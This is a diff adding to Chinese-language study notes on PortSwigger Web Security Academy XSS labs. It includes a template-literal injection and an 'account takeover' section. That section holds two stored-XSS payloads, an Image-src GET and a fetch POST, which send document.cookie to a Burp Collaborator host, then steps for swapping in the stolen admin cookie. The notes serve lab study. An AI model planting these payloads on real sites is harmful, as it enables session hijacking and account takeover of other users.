@@ -227,3 +227,28 @@ view-source:https://0aec00b003bd7f918144a7d000960063.web-security-academy.net/?s
 有了这些知识，才能做这个靶场
 如图，反射点在反引号里面，那我门可以${alert()}
 ![[Pasted image 20240914204504.png]]
+
+# xss账号接管
+涉及js构造请求，payload：放到评论里
+```
+<script>
+var img=new Image;
+img.src='http://og85up0qaft2ge6kcxsznn4ouf06owcl.oastify.com?cookie='+document.cookie
+</script>
+```
+上面那个发的是get，下面这个是post
+
+```
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+
+然后我们在服务器里找到session，这应该是靶场设定，设为管理员的cookie了
+![[Pasted image 20240914231333.png]]
+替换cookie，成功到管理员页面
+![[Pasted image 20240914231445.png]]
